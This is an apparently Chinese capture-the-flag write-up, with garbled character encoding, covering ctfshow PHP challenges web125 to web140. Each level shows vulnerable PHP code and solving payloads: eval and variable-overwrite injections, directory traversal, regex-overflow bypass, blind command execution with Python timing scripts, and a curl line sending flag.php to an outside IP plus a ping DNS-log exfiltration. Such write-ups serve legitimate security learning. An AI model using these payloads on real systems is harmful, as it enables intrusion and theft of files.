å‚çš„æ–¹æ³•ï¼Œä½†æ˜¯systemæ–¹æ³•åº”è¯¥æ˜¯è¢«banæ‰äº†\nåé¢å°è¯•highlight_fileæ–¹æ³•æˆåŠŸè¯»åˆ°flag\npayload:\nPOST CTF_SHOW=1\u0026amp;CTF[SHOW.COM=1\u0026amp;fun=highlight_file($_GET[1])\rGET 1=flag.php å…¶ä»–çš„ payloadï¼š\n1POST CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=var_export(get_defined_vars()) web126 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15$a=$_SERVER[\u0026#39;argv\u0026#39;]; 16$c=$_POST[\u0026#39;fun\u0026#39;]; 17if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 18 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\u0026#34;, $c) \u0026amp;\u0026amp; strlen($c)\u0026lt;=16){ 19 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 20 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 21 echo $flag; 22 } 23 } 24} åŸºæœ¬ä¸Šbanæ‰äº†èƒ½è¯»æ–‡ä»¶çš„å‡½æ•°\nå‚è€ƒctfshow-webå…¥é—¨-phpç‰¹æ€§ï¼ˆweb123ã€web125ã€web126ï¼‰_ctfshow web123-CSDNåšå®¢\npayload:\ngetï¼š?$fl0g=flag_give_me;\rpostï¼šCTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=eval($a[0])\ror\rGET:?$fl0g=flag_give_me\rPOST:CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=assert($a[0]) è¿™é‡Œçš„æŸ¥è¯¢å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å« fl0gï¼Œä½†åŒ…å«äº† $fl0gã€‚ç”±äº PHP ä¸­çš„å˜é‡åä¸åŒ…æ‹¬ $ ç¬¦å·ï¼Œæ‰€ä»¥ isset($_GET[\u0026lsquo;fl0g\u0026rsquo;]) ä»ç„¶ä¼šè¿”å› falseï¼Œå³æ²¡æœ‰æ£€æµ‹åˆ° fl0g å‚æ•°ã€‚\npost ä¼ å…¥ CTF_SHOW å’Œ CTF_SHOW.COM ç¡®ä¿ isset($_POST[\u0026lsquo;CTF_SHOW\u0026rsquo;]) \u0026amp;\u0026amp; isset($_POST[\u0026lsquo;CTF_SHOW.COM\u0026rsquo;]) è¿™éƒ¨åˆ†æ¡ä»¶ä¸ºçœŸï¼Œfun=eval($a[0]) å°† eval($a[0]) çš„ä»£ç ä¼ é€’ç»™ $cã€‚\nå‡†ç¡®æ¥è¯´ï¼Œæ­¤æ—¶çš„ $_SERVER[â€˜argvâ€™][0] å°±ç­‰äº $_SERVER[â€˜QUERY_STRINGâ€™]ï¼Œ$_SERVER[\u0026ldquo;QUERY_STRING\u0026rdquo;] å°±æ˜¯æŸ¥è¯¢ (query) çš„å­—ç¬¦ä¸²ï¼Œè¿™æ˜¯ç”±äº php.ini å¼€å¯äº†register_argc_argv é…ç½®é¡¹ã€‚\nå½“è®¿é—® ?$fl0g=flag_give_me; æ—¶ï¼ŒæœåŠ¡å™¨é…ç½®ä½¿å¾—æŸ¥è¯¢å­—ç¬¦ä¸²è¢«ä¼ é€’åˆ° $_SERVER[\u0026lsquo;argv\u0026rsquo;] ä¸­ã€‚ åœ¨è¿™ç§é…ç½®ä¸‹ï¼Œ$_SERVER[\u0026lsquo;argv\u0026rsquo;][0] åŒ…å«äº†æ•´ä¸ªæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå³ \u0026lsquo;$fl0g=flag_give_me;\u0026rsquo;ã€‚\nåœ¨ eval(\u0026quot;$c;\u0026rdquo;); ä¸­å®é™…æ‰§è¡Œçš„æ˜¯ eval(\u0026rsquo;eval($a[0]);\u0026rsquo;);ï¼Œå› ä¸º $a[0] æ˜¯ \u0026lsquo;$fl0g=flag_give_me;\u0026rsquo;ï¼Œè¿™ç›¸å½“äºæ‰§è¡Œäº† eval(\u0026rsquo;$fl0g=flag_give_me;\u0026rsquo;);ï¼Œè¿™æ ·å°±å®šä¹‰äº†å˜é‡ $fl0g å¹¶èµ‹å€¼ä¸º \u0026lsquo;flag_give_me\u0026rsquo;ã€‚\næœ€å åˆ¤æ–­ if($fl0g === \u0026ldquo;flag_give_me\u0026rdquo;)ï¼Œå› ä¸º $fl0g è¢«æ­£ç¡®åœ°è®¾ç½®ä¸ºäº† \u0026lsquo;flag_give_me\u0026rsquo;ï¼Œæ‰€ä»¥è¿™ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œå› æ­¤ï¼Œecho $flag; è¢«æ‰§è¡Œï¼Œè¾“å‡º $flagã€‚\nå…¶ä»–payload:\nGET:?a=1+fl0g=flag_give_me\rPOST:CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=parse_str($a[1]) ä¹ŸåŒæ ·æ˜¯ä¸ºäº†ä½¿fl0g=flag_give_me\nweb127 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-10 21:52:49 9 10*/ 11 12 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15highlight_file(__FILE__); 16$ctf_show = md5($flag); 17$url = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 18 19 20//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹ 21function waf($url){ 22 if(preg_match(\u0026#39;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\\u0026#39;|\\\u0026#34;|\\\u0026lt;|\\,|\\\u0026gt;|\\.|\\\\\\|\\//\u0026#39;, $url)){ 23 return true; 24 }else{ 25 return false; 26 } 27} 28 29if(waf($url)){ 30 die(\u0026#34;å—¯å“¼ï¼Ÿ\u0026#34;); 31}else{ 32 extract($_GET); 33} 34 35 36if($ctf_show===\u0026#39;ilove36d\u0026#39;){ 37 echo $flag; 38} å˜é‡è¦†ç›–\nç”±äºä¸‹åˆ’çº¿è¢«wafäº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ ctf%20showï¼Œphpä¼šå°†ç©ºæ ¼è§£ææˆ_\npayload:\nctf%20show=ilove36d web128 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-12 19:49:05 9 10*/ 11 12 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15highlight_file(__FILE__); 16 17$f1 = $_GET[\u0026#39;f1\u0026#39;]; 18$f2 = $_GET[\u0026#39;f2\u0026#39;]; 19 20if(check($f1)){ 21 var_dump(call_user_func(call_user_func($f1,$f2))); 22}else{ 23 echo \u0026#34;å—¯å“¼ï¼Ÿ\u0026#34;; 24} 25 26 27 28function check($str){ 29 return !preg_match(\u0026#39;/[0-9]|[a-z]/i\u0026#39;, $str); 30} ä»€ä¹ˆæ˜¯Gettextå‡½æ•°\nPHP: Gettext - Manual\néªšæ“ä½œ\nå°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°\r_()==gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll\rget_defined_vars()å‡½æ•°\rget_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag\rpayload: ?f1=_\u0026amp;f2=get_defined_vars web129 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 03:18:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;f\u0026#39;])){ 16 $f = $_GET[\u0026#39;f\u0026#39;]; 17 if(stripos($f, \u0026#39;ctfshow\u0026#39;)\u0026gt;0){ 18 echo readfile($f); 19 } 20} stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®\næ‰€ä»¥æˆ‘ä»¬è¦è€ƒè™‘åœ¨ctfshowå‰é¢æ”¾ç‚¹ä»€ä¹ˆï¼Œä½†åˆä¸å½±å“æˆ‘ä»¬è¯»æ–‡ä»¶\nå¯ä»¥è”æƒ³åˆ°ç›®å½•ç©¿è¶Š\npayload:\n/ctfshow/../../../../../../../../../../var/www/html/flag.php web130 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_POST[\u0026#39;f\u0026#39;])){ 17 $f = $_POST[\u0026#39;f\u0026#39;]; 18 19 if(preg_match(\u0026#39;/.+?ctfshow/is\u0026#39;, $f)){ 20 die(\u0026#39;bye!\u0026#39;); 21 } 22 if(stripos($f, \u0026#39;ctfshow\u0026#39;) === FALSE){ 23 die(\u0026#39;bye!!\u0026#39;); 24 } 25 26 echo $flag; 27 28} \u0026lsquo;/.+?ctfshow/is\u0026rsquo; åé¢çš„iè¡¨ç¤ºå¤§å°å†™åŒ¹é…ï¼Œsè¡¨ç¤ºå¿½ç•¥æ¢è¡Œç¬¦ï¼Œå•è¡ŒåŒ¹é…\nåœ¨ä¸åŠ è½¬ä¹‰å­—ç¬¦çš„å‰æä¸‹ï¼Œå‰é¢çš„ç‚¹è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œè€Œâ€œ+?â€è¡¨ç¤ºéè´ªå©ªåŒ¹é…ï¼Œå³å‰é¢çš„å­—ç¬¦è‡³å°‘å‡ºç°ä¸€æ¬¡\næ‰€ä»¥ï¼Œè¯¥æ­£åˆ™åŒ¹é…çš„æ„æ€ä¸ºï¼šctfshowå‰é¢å¦‚æœå‡ºç°ä»»æ„å­—ç¬¦ï¼Œå³åŒ¹é…å‡†ç¡®\nå†æ ¹æ®ä¸‹é¢çš„striposä¸ºå­—ç¬¦ä¸²åŒ¹é…å‡½æ•°ï¼Œè¦æ±‚è¾“å…¥çš„å‚æ•°å¿…é¡»æœ‰â€œctfshowâ€å­—ç¬¦ï¼Œæ‰€ä»¥è¾“å…¥çš„å‚æ•°åªéœ€è¦æ»¡è¶³ctfshowå‰é¢ä¸åŠ ä»»æ„å­—ç¬¦å³å¯\npayload\nPOST f=ctfshow web131 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_POST[\u0026#39;f\u0026#39;])){ 17 $f = (String)$_POST[\u0026#39;f\u0026#39;]; 18 19 if(preg_match(\u0026#39;/.+?ctfshow/is\u0026#39;, $f)){ 20 die(\u0026#39;bye!\u0026#39;); 21 } 22 if(stripos($f,\u0026#39;36Dctfshow\u0026#39;) === FALSE){ 23 die(\u0026#39;bye!!\u0026#39;); 24 } 25 26 echo $flag; 27 28} æ­£åˆ™è¡¨è¾¾å¼æº¢å‡º https://www.laruence.com/2010/06/08/1579.html\npayload:\n#payload:\r\u0026lt;?php\recho str_repeat(\u0026#39;very\u0026#39;, \u0026#39;250000\u0026#39;).\u0026#39;36Dctfshow\u0026#39;; ä¸å®œè¿‡å¤šï¼Œè¿‡å¤šä¼š\nweb132 /admin\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 06:22:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 20:05:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14#error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17 18 19if(isset($_GET[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;code\u0026#39;])){ 20 $username = (String)$_GET[\u0026#39;username\u0026#39;]; 21 $password = (String)$_GET[\u0026#39;password\u0026#39;]; 22 $code = (String)$_GET[\u0026#39;code\u0026#39;]; 23 24 if($code === mt_rand(1,0x36D) \u0026amp;\u0026amp; $password === $flag || $username ===\u0026#34;admin\u0026#34;){ 25 26 if($code == \u0026#39;admin\u0026#39;){ 27 echo $flag; 28 } 29 30 } 31} ç¬¬ä¸€ä¸ªåˆ¤æ–­åé¢ç”¨çš„æ˜¯æˆ–\nä¹Ÿå°±æ˜¯è¯´åªè¦ä½¿usernameç­‰äºadminå³å¯ï¼Œå‰é¢ä¸¤ä¸ªæ— æ‰€è°“äº†\nç¬¬äºŒä¸ªåˆ¤æ–­è®©codeç­‰äºadminå³å¯\npayloadï¼š\nGET:?code=admin\u0026amp;username=admin\u0026amp;password= web133 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 16:43:44 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14//flag.php 15if($F = @$_GET[\u0026#39;F\u0026#39;]){ 16 if(!preg_match(\u0026#39;/system|nc|wget|exec|passthru|netcat/i\u0026#39;, $F)){ 17 eval(substr($F,0,6)); 18 }else{ 19 die(\u0026#34;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!\u0026#34;); 20 } 21} ctfshow web133(å˜é‡è¦†ç›–+æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œdns_bpå¸¦å¤–) - hithub - åšå®¢å›­\nè¿™å…¶å®æ˜¯ä¸€é“å…³äºå˜é‡è¦†ç›–çš„é¢˜ç›®\ngetä¼ å‚ F=`$F `;sleep 3\rç»è¿‡substr($F,0,6)æˆªå–å å¾—åˆ° `$F `;\rä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ eval(\u0026#34;`$F `;\u0026#34;);\ræˆ‘ä»¬æŠŠåŸæ¥çš„$Få¸¦è¿›å»\reval(\u0026#34;``$F `;sleep 3`\u0026#34;);\rä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ ` `$F `;sleep 3 ` == shell_exec(\u0026#34;`$F `;sleep 3\u0026#34;);\rå‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚\rè¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† sleep 3\ræ‰€ä»¥ æœ€åå°±æ˜¯ä¸€é“æ— å›æ˜¾çš„RCEé¢˜ç›®äº† payload:\n`$F `;cat flag.php | curl -X POST -d @- http://106.55.168.231:7777/ curlå¤–å¸¦rce\nweb134 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-14 23:01:06 9 10*/ 11 12highlight_file(__FILE__); 13$key1 = 0; 14$key2 = 0; 15if(isset($_GET[\u0026#39;key1\u0026#39;]) || isset($_GET[\u0026#39;key2\u0026#39;]) || isset($_POST[\u0026#39;key1\u0026#39;]) || isset($_POST[\u0026#39;key2\u0026#39;])) { 16 die(\u0026#34;nonononono\u0026#34;); 17} 18@parse_str($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]); 19extract($_POST); 20if($key1 == \u0026#39;36d\u0026#39; \u0026amp;\u0026amp; $key2 == \u0026#39;36d\u0026#39;) { 21 die(file_get_contents(\u0026#39;flag.php\u0026#39;)); 22} çœ‹åˆ°extractæƒ³èµ·å˜é‡è¦†ç›–\nextract($_POST);\r//æå–$_POSTæ•°ç»„ payload:\n?_POST[key1]=36d\u0026amp;_POST[key2]=36d web135 \u0026lt;?php\r/*\r# -*- coding: utf-8 -*-\r# @Author: Firebasky\r# @Date: 2020-10-13 11:25:09\r# @Last Modified by: h1xa\r# @Last Modified time: 2020-10-16 18:48:03\r*/\rerror_reporting(0);\rhighlight_file(__FILE__);\r//flag.php\rif($F = @$_GET[\u0026#39;F\u0026#39;]){\rif(!preg_match(\u0026#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i\u0026#39;, $F)){\reval(substr($F,0,6));\r}else{\rdie(\u0026#34;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§\u0026#34;);\r}\r} 133plus\nè¿™é¢˜banäº†å¾ˆå¤šå‘½ä»¤\nä½†æ˜¯æ²¡ban nl,mvï¼Œå¯ä»¥ç”¨nlå’ŒcpæŠŠflagå†™åˆ°å…¶ä»–æ–‡ä»¶ä¸­\npayload:\n`$F `;nl f*\u0026gt;1.txt\r`$F `;mv f*\u0026gt;1.txt è¿™é¢˜ä¹Ÿå¯ä»¥ç”¨pingè¿›è¡Œå¤–å¸¦\n`$F`;+ping `cat flag.php|awk \u0026#39;NR==2\u0026#39;`.6x1sys.dnslog.cn\r#é€šè¿‡pingå‘½ä»¤å»å¸¦å‡ºæ•°æ®ï¼Œç„¶åawk NRä¸€æ’ä¸€æ’çš„è·å¾—æ•°æ® web136 1\u0026lt;?php 2error_reporting(0); 3function check($x){ 4 if(preg_match(\u0026#39;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026amp;|\\*|\\?|\\{|\\}|\\\u0026gt;|\\\u0026lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i\u0026#39;, $x)){ 5 die(\u0026#39;too young too simple sometimes naive!\u0026#39;); 6 } 7} 8if(isset($_GET[\u0026#39;c\u0026#39;])){ 9 $c=$_GET[\u0026#39;c\u0026#39;]; 10 check($c); 11 exec($c); 12} 13else{ 14 highlight_file(__FILE__); 15} 16?\u0026gt; è¿™é¢˜è¦ç”¨åˆ°ä¸€ä¸ªlinuxçš„å‘½ä»¤tee\nLinux teeå‘½ä»¤ä»‹ç» teeå‘½ä»¤åœ¨Linuxä¸­ç”¨äºä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶å†™å…¥åˆ°æ ‡å‡†è¾“å‡ºå’Œä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ä¸­ã€‚teeå‘½ä»¤é€šå¸¸ä¸å…¶ä»–å‘½ä»¤ä¸€èµ·é€šè¿‡ç®¡é“ä½¿ç”¨ã€‚\nå¦‚\n1ls /|tee 1.txt å°±å¯ä»¥å°†ls /çš„ç»“æœå†™å…¥åˆ°1.txtæ–‡ä»¶ä¸­\nls /|tee 1 è¿™é¢˜banæ‰äº†.\nè®¿é—®url/1ï¼Œä¸‹è½½æ–‡ä»¶1\nçœ‹åˆ°flagçš„ä½ç½®\n?c=cat /f149_15_h3r3|tee 2 web137 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:27:49 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\u0026#34;private class\u0026#34;); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 21 } 22} 23 24 25 26call_user_func($_POST[\u0026#39;ctfshow\u0026#39;]); æˆ‘ä»¬éœ€è¦é€šè¿‡postä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­åŒ…å«ç±»åå’Œæ–¹æ³•å\npayload\nctfshow[]=ctfshow\u0026amp;ctfshow[]=getFlag åˆæˆ–è€…\nctfshow=ctfshow::getFlag web138 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:52:13 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\u0026#34;private class\u0026#34;); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 21 } 22} 23 24if(strripos($_POST[\u0026#39;ctfshow\u0026#39;], \u0026#34;:\u0026#34;)\u0026gt;-1){ 25 die(\u0026#34;private function\u0026#34;); 26} 27 28call_user_func($_POST[\u0026#39;ctfshow\u0026#39;]); è¿™é“é¢˜é™åˆ¶äº†ä¸Šä¸€é¢˜çš„ç¬¬äºŒç§è§£æ³•\nç¬¬ä¸€ç§è¿˜èƒ½ç»§ç»­ä½¿ç”¨\npayload:\nctfshow[]=ctfshow\u0026amp;ctfshow[]=getFlag\rctfshow[0]=ctfshow\u0026amp;ctfshow[1]=getFlag web139 \u0026lt;?php\rerror_reporting(0);\rfunction check($x){\rif(preg_match(\u0026#39;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026amp;|\\*|\\?|\\{|\\}|\\\u0026gt;|\\\u0026lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i\u0026#39;, $x)){\rdie(\u0026#39;too young too simple sometimes naive!\u0026#39;);\r}\r}\rif(isset($_GET[\u0026#39;c\u0026#39;])){\r$c=$_GET[\u0026#39;c\u0026#39;];\rcheck($c);\rexec($c);\r}\relse{\rhighlight_file(__FILE__);\r}\r?\u0026gt; è¿™é¢˜çœ‹ç€å’Œå‰é¢é‚£é¢˜æ˜¯ä¸€æ ·çš„\nä½†å®é™…ä¸Šæ²¡æœ‰å†™æ–‡ä»¶çš„æƒé™\nè¿™é¢˜å¯ä»¥é€šè¿‡æ—¶é—´ç›²æ³¨æ”»å‡»è·å–æ–‡ä»¶åå·²ç»æ–‡ä»¶ä¸­çš„å­—ç¬¦ç­‰\næ—¶é—´ç›²æ³¨è„šæœ¬ï¼š\n1import requests 2import time 3import string 4 5str = string.ascii_letters + string.digits + \u0026#34;-\u0026#34; + \u0026#34;{\u0026#34; + \u0026#34;}\u0026#34; + \u0026#34;_\u0026#34; + \u0026#34;~\u0026#34; # æ„å»ºä¸€ä¸ªåŒ…å«æ‰€æœ‰å­—æ¯å’Œæ•°å­—ä»¥åŠéƒ¨åˆ†ç¬¦å·çš„å­—ç¬¦ä¸²ï¼Œç¬¦å·å¯ä»¥è‡ªå·±åŠ  6result = \u0026#34;\u0026#34; # åˆå§‹åŒ–ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œç”¨äºä¿å­˜ç»“æœ 7 8#è·å–å¤šå°‘è¡Œ 9for i in range(1, 99): 10 key = 0 #ç”¨äºæ§åˆ¶å†…å±‚å¾ªç¯(j)çš„ç»“æŸ 11 12 #ä¸breakçš„æƒ…å†µä¸‹ï¼Œä¸€è¡Œæœ€å¤šå‡ ä¸ªå­—ç¬¦ 13 for j in range(1, 99): 14 if key == 1: 15 break 16 for n in str: #nå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„è¿”å›å€¼ 17 payload = \u0026#34;if [ `ls /|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1}` == {2} ];then sleep 3;fi\u0026#34;.format(i, j, n) #{n}æ˜¯å ä½ç¬¦ 18 #print(payload) 19 url = \u0026#34;http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=\u0026#34; + payload 20 try: 21 requests.get(url, timeout=(2.5, 2.5)) #è®¾ç½®è¶…æ—¶æ—¶é—´ä¸º 2.5 ç§’,åŒ…æ‹¬è¿æ¥è¶…æ—¶å’Œè¯»å–è¶…æ—¶ï¼Œè¶…æ—¶å°±æ˜¯ä¹‹å‰sleep 3äº†ã€‚ 22 23 # å¦‚æœè¯·æ±‚å‘ç”Ÿå¼‚å¸¸ï¼Œè¡¨ç¤ºæ¡ä»¶æ»¡è¶³ï¼Œå°†å½“å‰å­—ç¬¦ n æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ï¼Œå¹¶ç»“æŸå½“å‰å†…å±‚å¾ªç¯ 24 except: 25 result = result + n 26 print(result) 27 break 28 if n == \u0026#39;~\u0026#39;: #strçš„æœ€åä¸€ä½ï¼Œâ€œ~â€ä¸å¸¸å‡ºç°ï¼Œç”¨ä½œç»“å°¾ 29 key = 1 30 31 # åœ¨æ¯æ¬¡è·å–ä¸€ä¸ªå­—ç¬¦åï¼Œå°†ä¸€ä¸ªç©ºæ ¼æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ï¼Œç”¨äºåˆ†éš”ç»“æœçš„ä¸åŒä½ç½® 32 result += \u0026#34; \u0026#34; è¿™ä¸ªè„šæœ¬çš„åŸç†å…¶å®å°±æ˜¯ï¼Œé€šè¿‡shellç¼–ç¨‹ä¸­çš„ifè¯­å¥åˆ¤æ–­\nls /|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1} ä¸­æˆªå–åˆ°çš„å­—ç¬¦ä¸²æ˜¯å¦ä¸æˆ‘ä»¬éå†çš„ä»»ä¸€ä¸ªå­—ç¬¦åŒ¹é…ï¼Œè‹¥åŒ¹é…æˆåŠŸåˆ™ä½¿ç”¨sleepå‘½ä»¤ä½¿å“åº”æ—¶é—´å˜ä¸º3s\nè€Œè„šæœ¬é€šè¿‡åˆ¤æ–­å“åº”æ—¶é—´å³å¯çŸ¥é“æˆªå–åˆ°çš„å­—ç¬¦æ˜¯å¦åŒ¹é…ï¼Œä»è€Œä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çš„è·å–\nè¯»åˆ°flagçš„ä½ç½®ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»æ–‡ä»¶äº†ï¼ŒåŸç†ä¸€æ ·\n1import requests 2import time 3import string 4 5str = string.digits+string.ascii_lowercase+\u0026#34;-\u0026#34;+\u0026#34;{\u0026#34;+\u0026#34;}\u0026#34; 6result = \u0026#34;\u0026#34; 7 8for i in range(1, 99): 9 key = 0 10 for j in range(1, 99): 11 if key == 1: 12 break 13 for n in str: 14 payload = \u0026#34;if [ `cat /f149_15_h3r3|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1}` == {2} ];then sleep 3;fi\u0026#34;.format(i, j, n) 15 #print(payload) 16 url = \u0026#34;http://a37f8386-b265-4794-b4d1-7e4e62f05859.challenge.ctf.show//?c=\u0026#34; + payload 17 try: 18 requests.get(url, timeout=(2.5, 2.5)) 19 20\texcept: 21 result = result + n 22 print(result) 23 break 24 25 result += \u0026#34; \u0026#34; web140 å‡½æ•°çš„åˆ©ç”¨\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 12:39:25 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_POST[\u0026#39;f1\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;f2\u0026#39;])){ 15 $f1 = (String)$_POST[\u0026#39;f1\u0026#39;]; 16 $f2 = (String)$_POST[\u0026#39;f2\u0026#39;]; 17 if(preg_match(\u0026#39;/^[a-z0-9]+$/\u0026#39;, $f1)){ 18 if(preg_match(\u0026#39;/^[a-z0-9]+$/\u0026#39;, $f2)){ 19 $code = eval(\u0026#34;return $f1($f2());\u0026#34;); 20 if(intval($code) == \u0026#39;ctfshow\u0026#39;){ 21 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 22 } 23 } 24 } 25} åŸæ–‡\néœ€è¦$f1($f2());çš„è¿”å›å€¼ï¼Œæˆ–è€…æ˜¯å­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œæˆ–è€…æ˜¯ç©ºæ•°ç»„ï¼Œæˆ–è€…å°±æ˜¯0ï¼Œæˆ–è€…FLASEã€‚\npayload1ï¼š system(system())\u0026mdash;\u0026gt; f1=system\u0026amp;f2=system\nstring system( string $command[, int \u0026amp;$return_var] 